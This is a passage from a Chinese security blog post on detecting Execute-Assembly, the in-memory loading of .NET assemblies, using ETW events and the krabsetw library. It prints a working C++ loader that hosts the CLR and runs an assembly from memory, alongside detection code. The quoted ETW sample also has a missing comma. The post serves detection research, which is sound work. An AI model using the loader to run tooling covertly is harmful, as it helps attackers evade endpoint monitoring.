class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;metahost.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#import <span class="meta-string">"mscorlib.tlb"</span> raw_interfaces_only\</span></div><div class="line">    high_property_prefixes(<span class="string">"_get"</span>,<span class="string">"_put"</span>,<span class="string">"_putref"</span>)\</div><div class="line">    rename(<span class="string">"ReportEvent"</span>, <span class="string">"InteropServices_ReportEvent"</span>)\</div><div class="line">rename(<span class="string">"or"</span>, <span class="string">"InteropServices_or"</span>)</div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> mscorlib;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"MSCorEE.lib"</span>)</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</div><div class="line">&#123;</div><div class="line">HANDLE hFile = CreateFileA(<span class="string">"CSharp.exe"</span>,</div><div class="line">GENERIC_READ | GENERIC_WRITE,</div><div class="line">FILE_SHARE_READ,</div><div class="line"><span class="literal">NULL</span>,</div><div class="line">OPEN_EXISTING,</div><div class="line">FILE_ATTRIBUTE_NORMAL,</div><div class="line"><span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hFile)</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">DWORD dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (dwFileSize == <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">PVOID dotnetRaw = <span class="built_in">malloc</span>(dwFileSize);</div><div class="line"><span class="built_in">memset</span>(dotnetRaw, <span class="number">0</span>, dwFileSize);</div><div class="line">DWORD dwReturn = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (ReadFile(hFile, dotnetRaw, dwFileSize, &amp;dwReturn, <span class="literal">NULL</span>)==FALSE)</div><div class="line">&#123;</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ICLRMetaHost* iMetaHost = <span class="literal">NULL</span>;</div><div class="line">ICLRRuntimeInfo* iRuntimeInfo = <span class="literal">NULL</span>;</div><div class="line">ICorRuntimeHost* iRuntimeHost = <span class="literal">NULL</span>;</div><div class="line">IUnknownPtr pAppDomain = <span class="literal">NULL</span>;</div><div class="line">_AppDomainPtr pDefaultAppDomain = <span class="literal">NULL</span>;</div><div class="line">_AssemblyPtr pAssembly = <span class="literal">NULL</span>;</div><div class="line">_MethodInfoPtr pMethodInfo = <span class="literal">NULL</span>;</div><div class="line">SAFEARRAYBOUND saBound[<span class="number">1</span>];</div><div class="line"><span class="keyword">void</span>* pData = <span class="literal">NULL</span>;</div><div class="line">VARIANT vRet;</div><div class="line">VARIANT vObj;</div><div class="line">VARIANT vPsa;</div><div class="line">SAFEARRAY* args = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line"><span class="comment">//检测点1</span></div><div class="line">CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&amp;iMetaHost);</div><div class="line">iMetaHost-&gt;GetRuntime(<span class="string">L"v4.0.30319"</span>, IID_ICLRRuntimeInfo, (VOID**)&amp;iRuntimeInfo);</div><div class="line">iRuntimeInfo-&gt;GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&amp;iRuntimeHost);</div><div class="line">iRuntimeHost-&gt;Start();</div><div class="line"></div><div class="line"></div><div class="line">iRuntimeHost-&gt;GetDefaultDomain(&amp;pAppDomain);</div><div class="line">pAppDomain-&gt;QueryInterface(__uuidof(_AppDomain), (VOID**)&amp;pDefaultAppDomain);</div><div class="line"></div><div class="line">saBound[<span class="number">0</span>].cElements = dwFileSize;</div><div class="line">saBound[<span class="number">0</span>].lLbound = <span class="number">0</span>;</div><div class="line">SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, <span class="number">1</span>, saBound);</div><div class="line"></div><div class="line">SafeArrayAccessData(pSafeArray, &amp;pData);</div><div class="line"><span class="built_in">memcpy</span>(pData, dotnetRaw, dwFileSize);</div><div class="line"><span class="comment">//free(dotnetRaw);   //释放1</span></div><div class="line">SafeArrayUnaccessData(pSafeArray);</div><div class="line"></div><div class="line"><span class="comment">//检测点2</span></div><div class="line">pDefaultAppDomain-&gt;Load_3(pSafeArray, &amp;pAssembly);</div><div class="line"><span class="comment">//free(pSafeArray-&gt;pvData);</span></div><div class="line">pAssembly-&gt;get_EntryPoint(&amp;pMethodInfo);</div><div class="line"></div><div class="line">ZeroMemory(&amp;vRet, <span class="keyword">sizeof</span>(VARIANT));</div><div class="line">ZeroMemory(&amp;vObj, <span class="keyword">sizeof</span>(VARIANT));</div><div class="line">vObj.vt = VT_NULL;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">vPsa.vt = (VT_ARRAY | VT_BSTR);</div><div class="line">args = SafeArrayCreateVector(VT_VARIANT, <span class="number">0</span>, <span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</div><div class="line">&#123;</div><div class="line">vPsa.parray = SafeArrayCreateVector(VT_BSTR, <span class="number">0</span>, argc);</div><div class="line"><span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; argc; i++)</div><div class="line">&#123;</div><div class="line">SafeArrayPutElement(vPsa.parray, &amp;i, SysAllocString((OLECHAR*)argv[i]));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">long</span> idx[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">SafeArrayPutElement(args, idx, &amp;vPsa);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//检测点3</span></div><div class="line">HRESULT hr = pMethodInfo-&gt;Invoke_3(vObj, args, &amp;vRet);</div><div class="line">pMethodInfo-&gt;Release();</div><div class="line">pAssembly-&gt;Release();</div><div class="line">pDefaultAppDomain-&gt;Release();</div><div class="line">iRuntimeInfo-&gt;Release();</div><div class="line">iMetaHost-&gt;Release();</div><div class="line">CoUninitialize();</div><div class="line">getchar();</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><h2 id="0x02-Execute-Assembly检测思路"><a href="#0x02-Execute-Assembly检测思路" class="headerlink" title="0x02 Execute-Assembly检测思路"></a>0x02 Execute-Assembly检测思路</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述的Execute-Assembly的实现原理，可以预测到Execute-Assembly主要有3个检测点。第一个检测点是加载CLR环境，第二个检测点是加载程序集，第三个检测点在于执行入口点的地方。在我看来，第一第二个检测点是比较好实现的。</p><h3 id="0x2-1-ETW使用前置知识"><a href="#0x2-1-ETW使用前置知识" class="headerlink" title="0x2.1 ETW使用前置知识"></a>0x2.1 ETW使用前置知识</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据XPN在他的博文<a href="https://blog.xpnsec.com/hiding-your-dotnet-etw/" target="_blank" rel="external">Hiding your .NET - ETW</a>一文中指出利用ETW(Event Trace for Windows)检测CLR的加载。而ProcessHacker或者ProcessExplorer这两款工具都能从进程角度查看进程是否加载了CLR环境。<br>    <img src="http://hacky.wang/blog/20221106/jdkBRwsOr2Rm.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用<code>logman query providers</code>命令查看所有的提供者。如图，执行结果的第一项是提供者名称，第二项是提供者对应的GUID。<br>    <img src="http://hacky.wang/blog/20221106/9SX9QK1UG3uY.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也可以通过设置指定得<code>provider name</code>或者<code>GUID</code>来获取具体的提供者的详细信息。即使用<code>logman query providers &lt;provider name&gt;</code>或者<code>logman query providers &lt;GUID&gt;</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过执行<code>logman query providers &quot;.NET Common Language Runtime&quot;</code>语句返回的结果如下。除了具有第一部分提供程序的名称和GUID之外，第二部分是一些关键字的信息，也就是筛选事件的标志。通过设置这些标志来筛选我们所需要的事件。第三部分是安全级别，而第四部分对应的是事件对应的进程ID和进程路径。<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line">PS C:\Users\14349&gt; logman query providers ".NET Common Language Runtime"</div><div class="line"></div><div class="line">提供程序                                 GUID</div><div class="line">-------------------------------------------------------------------------------</div><div class="line"><span class="title">.NET Common Language Runtime             &#123;E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4&#125;</span></div><div class="line"></div><div class="line">值                   关键字                  描述</div><div class="line">-------------------------------------------------------------------------------</div><div class="line">0x0000000000000001  GCKeyword            GC</div><div class="line">0x0000000000000002  GCHandleKeyword      GCHandle</div><div class="line">0x0000000000000004  FusionKeyword        Binder</div><div class="line">0x0000000000000008  LoaderKeyword        Loader</div><div class="line">0x0000000000000010  JitKeyword           Jit</div><div class="line">0x0000000000000020  NGenKeyword          NGen</div><div class="line">0x0000000000000040  StartEnumerationKeyword StartEnumeration</div><div class="line">0x0000000000000080  EndEnumerationKeyword StopEnumeration</div><div class="line">0x0000000000000400  SecurityKeyword      Security</div><div class="line">0x0000000000000800  AppDomainResourceManagementKeyword AppDomainResourceManagement</div><div class="line">0x0000000000001000  JitTracingKeyword    JitTracing</div><div class="line">0x0000000000002000  InteropKeyword       Interop</div><div class="line">0x0000000000004000  ContentionKeyword    Contention</div><div class="line">0x0000000000008000  ExceptionKeyword     Exception</div><div class="line">0x0000000000010000  ThreadingKeyword     Threading</div><div class="line">0x0000000000020000  JittedMethodILToNativeMapKeyword JittedMethodILToNativeMap</div><div class="line">0x0000000000040000  OverrideAndSuppressNGenEventsKeyword OverrideAndSuppressNGenEvents</div><div class="line">0x0000000000080000  TypeKeyword          Type</div><div class="line">0x0000000000100000  GCHeapDumpKeyword    GCHeapDump</div><div class="line">0x0000000000200000  GCSampledObjectAllocationHighKeyword GCSampledObjectAllocationHigh</div><div class="line">0x0000000000400000  GCHeapSurvivalAndMovementKeyword GCHeapSurvivalAndMovement</div><div class="line">0x0000000000800000  GCHeapCollectKeyword GCHeapCollect</div><div class="line">0x0000000001000000  GCHeapAndTypeNamesKeyword GCHeapAndTypeNames</div><div class="line">0x0000000002000000  GCSampledObjectAllocationLowKeyword GCSampledObjectAllocationLow</div><div class="line">0x0000000020000000  PerfTrackKeyword     PerfTrack</div><div class="line">0x0000000040000000  StackKeyword         Stack</div><div class="line">0x0000000080000000  ThreadTransferKeyword ThreadTransfer</div><div class="line">0x0000000100000000  DebuggerKeyword      Debugger</div><div class="line">0x0000000200000000  MonitoringKeyword    Monitoring</div><div class="line"></div><div class="line">值                   级别                   描述</div><div class="line">-------------------------------------------------------------------------------</div><div class="line">0x00                win:LogAlways        Log Always</div><div class="line">0x02                win:Error            Error</div><div class="line">0x04                win:Informational    Information</div><div class="line">0x05                win:Verbose          Verbose</div><div class="line"></div><div class="line">PID                 映像</div><div class="line">-------------------------------------------------------------------------------</div><div class="line">0x000035a8          C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</div><div class="line">0x000022dc          F:\users\MPic 2.2.1.3\MPic.exe</div><div class="line">0x000033c8          F:\users\markdownpad2-portable\MarkdownPad2.exe</div><div class="line">0x00001b3c          C:\Program Files\CONEXANT\SAII\SmartAudio.exe</div><div class="line">0x00001818</div><div class="line">0x00000e34</div><div class="line"></div><div class="line"></div><div class="line">命令成功结束。</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XPN在他的博文<a href="https://blog.xpnsec.com/hiding-your-dotnet-etw/" target="_blank" rel="external">Hiding your .NET - ETW</a>中，也给出了验证测试代码,代码的功能简而言之就是通过ETW<code>实时的</code>捕获<code>.NET Common Language Runtime</code>提供者的<code>AssemblyDCStart_V1</code>事件。但是这个验证代码有一个缺陷就是，只有当Assembly Loader进程退出后才能捕获对应的<code>AssemblyDCStart_V1</code>事件。但是，这对我来说是致命的。所以我尝试使用krabsetw库来实现。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> AssemblyDCStart_V1 155</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LoaderKeyword 0x08</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wbemidl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wmistr.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;evntrace.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Evntcons.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">static</span> GUID ClrRuntimeProviderGuid = &#123; <span class="number">0xe13c0d23</span>, <span class="number">0xccbc</span>, <span class="number">0x4e12</span>, &#123; <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0xd9</span>, <span class="number">0xcc</span>, <span class="number">0x2e</span>, <span class="number">0xee</span>, <span class="number">0x27</span>, <span class="number">0xe4</span> &#125; &#125;;</div><div class="line"></div><div class="line"><span class="comment">// Can be stopped with 'logman stop "dotnet trace" -etw'</span></div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> name[] = <span class="string">"dotnet trace\0"</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)</span></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">AssemblyLoadUnloadRundown_V1</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">    ULONG64 AssemblyID;</div><div class="line">    ULONG64 AppDomainID;</div><div class="line">    ULONG64 BindingID;</div><div class="line">    ULONG AssemblyFlags;</div><div class="line">    WCHAR FullyQualifiedAssemblyName[<span class="number">1</span>];</div><div class="line">&#125; AssemblyLoadUnloadRundown_V1, *PAssemblyLoadUnloadRundown_V1;</div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> NTAPI <span class="title">ProcessEvent</span><span class="params">(PEVENT_RECORD EventRecord)</span> </span>&#123;</div><div class="line"></div><div class="line">    PEVENT_HEADER eventHeader = &amp;EventRecord-&gt;EventHeader;</div><div class="line">    PEVENT_DESCRIPTOR eventDescriptor = &amp;eventHeader-&gt;EventDescriptor;</div><div class="line">    AssemblyLoadUnloadRundown_V1* assemblyUserData;</div><div class="line"></div><div class="line">    <span class="keyword">switch</span> (eventDescriptor-&gt;Id) &#123;</div><div class="line">        <span class="keyword">case</span> AssemblyDCStart_V1:</div><div class="line">            assemblyUserData = (AssemblyLoadUnloadRundown_V1*)EventRecord-&gt;UserData;</div><div class="line">            wprintf(<span class="string">L"[%d] - Assembly: %s\n"</span>, eventHeader-&gt;ProcessId, assemblyUserData-&gt;FullyQualifiedAssemblyName);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    TRACEHANDLE hTrace = <span class="number">0</span>;</div><div class="line">    ULONG result, bufferSize;</div><div class="line">    EVENT_TRACE_LOGFILEA trace;</div><div class="line">    EVENT_TRACE_PROPERTIES *traceProp;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"ETW .NET Trace example - @_xpn_\n\n"</span>);</div><div class="line"></div><div class="line">    <span class="built_in">memset</span>(&amp;trace, <span class="number">0</span>, <span class="keyword">sizeof</span>(EVENT_TRACE_LOGFILEA));</div><div class="line">    trace.ProcessTraceMode    = PROCESS_TRACE_MODE_REAL_TIME | PROCESS_TRACE_MODE_EVENT_RECORD;</div><div class="line">    trace.LoggerName          = (LPSTR)name;</div><div class="line">    trace.EventRecordCallback = (PEVENT_RECORD_CALLBACK)ProcessEvent;</div><div class="line"></div><div class="line">    bufferSize = <span class="keyword">sizeof</span>(EVENT_TRACE_PROPERTIES) + <span class="keyword">sizeof</span>(name) + <span class="keyword">sizeof</span>(WCHAR);</div><div class="line"></div><div class="line">    traceProp = (EVENT_TRACE_PROPERTIES*)LocalAlloc(LPTR, bufferSize);</div><div class="line">    traceProp-&gt;Wnode.BufferSize    = bufferSize;</div><div class="line">    traceProp-&gt;Wnode.ClientContext = <span class="number">2</span>;</div><div class="line">    traceProp-&gt;Wnode.Flags         = WNODE_FLAG_TRACED_GUID;</div><div class="line">    traceProp-&gt;LogFileMode         = EVENT_TRACE_REAL_TIME_MODE | EVENT_TRACE_USE_PAGED_MEMORY;</div><div class="line">    traceProp-&gt;LogFileNameOffset   = <span class="number">0</span>;</div><div class="line">    traceProp-&gt;LoggerNameOffset    = <span class="keyword">sizeof</span>(EVENT_TRACE_PROPERTIES);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((result = StartTraceA(&amp;hTrace, (LPCSTR)name, traceProp)) != ERROR_SUCCESS) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Error starting trace: %d\n"</span>, result);</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((result = EnableTraceEx(</div><div class="line">        &amp;ClrRuntimeProviderGuid,</div><div class="line">        <span class="literal">NULL</span>,</div><div class="line">        hTrace,</div><div class="line">        <span class="number">1</span>,</div><div class="line">        TRACE_LEVEL_VERBOSE,</div><div class="line">        LoaderKeyword</div><div class="line">        <span class="number">0</span>,</div><div class="line">        <span class="number">0</span>,</div><div class="line">        <span class="literal">NULL</span></div><div class="line">    )) != ERROR_SUCCESS) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Error EnableTraceEx\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    hTrace = OpenTrace(&amp;trace);</div><div class="line">    <span class="keyword">if</span> (hTrace == INVALID_PROCESSTRACE_HANDLE) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Error OpenTrace\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">3</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    result = ProcessTrace(&amp;hTrace, <span class="number">1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">    <span class="keyword">if</span> (result != ERROR_SUCCESS) &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Error ProcessTrace\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">4</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="0x2-2-krabsetw安装与使用"><a href="#0x2-2-krabsetw安装与使用" class="headerlink" title="0x2.2 krabsetw安装与使用"></a>0x2.2 krabsetw安装与使用</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/microsoft/krabsetw" target="_blank" rel="external">krabsetw</a>是微软开发的一个C++库，其主要目的在于简化ETW的交互。krabsetw目前只支持x64的操作系统，而且编译环境最好是VS2017及以上。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文也并不使用推荐的NuGet安装krabsetw。而是使用vcpkg进行包管理。具体的关于NuGet的使用可以参考<a href="https://zhuanlan.zhihu.com/p/153199835" target="_blank" rel="external">这篇文章</a>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 当编译完成<code>vcpkg.exe</code>之后，使用<code>.\vcpkg.exe list</code>查看已经安装的开源库，然后使用<code>.\vcpkg.exe install krabsetw:x64-windows</code>安装krabsetw库。并且一定要将项目的预处理器设置为<code>UNICODE</code>。至于<code>NDEBUG</code>和<code>TYPEASSERT</code>任选其一进行设置。这是krabsetw项目所规定的。具体参见项目说明：<a href="https://github.com/microsoft/krabsetw/blob/master/krabs/README.md" target="_blank" rel="external">https://github.com/microsoft/krabsetw/blob/master/krabs/README.md</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用krabsetw捕获CLR加载事件代码如下，具体的使用例子可以参考<a href="https://github.com/microsoft/krabsetw/blob/master/examples/NativeExamples/user_trace_001.cpp" target="_blank" rel="external">krabsetw例子说明</a>。值得注意的是这个设置的关键字我设置的是<code>MonitoringKeyword</code>是可以实时监控的。而不是设置<code>LoaderKeyword</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MonitoringKeyword 0x0000000200000000  </span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">DetectByETW</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="comment">//回调函数</span></div><div class="line"><span class="keyword">auto</span> assembly_callback = [](<span class="keyword">const</span> EVENT_RECORD&amp; record, <span class="keyword">const</span> krabs::trace_context&amp; trace_context)</div><div class="line">&#123;</div><div class="line"></div><div class="line">krabs::schema schema(record, trace_context.schema_locator);</div><div class="line">krabs::<span class="function">parser <span class="title">parser</span><span class="params">(schema)</span></span>;</div><div class="line">pids.push_back(record.EventHeader.ProcessId);</div><div class="line"><span class="comment">//获取ProcessId</span></div><div class="line">DWORD dwPid = record.EventHeader.ProcessId;</div><div class="line">WCHAR szExeFile[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</div><div class="line">DWORD dwSize = MAX_PATH;</div><div class="line">HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);</div><div class="line">QueryFullProcessImageNameW(hProcess, <span class="number">0</span>, szExeFile, &amp;dwSize);</div><div class="line"><span class="comment">//检测内存信息</span></div><div class="line">BOOL bIsExecuteAssembly = DetectByMemory(hProcess);</div><div class="line"><span class="keyword">if</span> (bIsExecuteAssembly == TRUE)</div><div class="line">&#123;</div><div class="line">SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY | BACKGROUND_BLUE);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[%d] : %ls is execute-Assembly(.Net Load Memory)\n"</span>, dwPid, szExeFile);</div><div class="line">SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[%d] : %ls\n"</span>, dwPid, szExeFile);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line"></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">//设置跟踪会话</span></div><div class="line">krabs::<span class="function">user_trace <span class="title">trace</span><span class="params">(<span class="string">L"Assembly Load Monitor"</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="comment">//设置Provider</span></div><div class="line">krabs::provider&lt;&gt; dotnet_rundown_provider(<span class="string">L".NET Common Language Runtime"</span>);  <span class="comment">//L".NET Common Language Runtime"</span></div><div class="line"></div><div class="line"><span class="comment">//设置筛选事件关键字，逻辑为any模式</span></div><div class="line">dotnet_rundown_provider.any(MonitoringKeyword);</div><div class="line"></div><div class="line"><span class="comment">//设置回调函数</span></div><div class="line">dotnet_rundown_provider.add_on_event_callback(assembly_callback);</div><div class="line"></div><div class="line"><span class="comment">//开始</span></div><div class="line">trace.enable(dotnet_rundown_provider);</div><div class="line">trace.start();</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="0x2-3-加载程序集"><a href="#0x2-3-加载程序集" class="headerlink" title="0x2.3 加载程序集"></a>0x2.3 加载程序集</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二个检测点位于加载程序集之后。在memcpy处打一个断点。<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">SafeArrayAccessData</span>(pSafeArray, &amp;pData);</div><div class="line"><span class="selector-tag">memcpy</span>(pData, dotnetRaw, 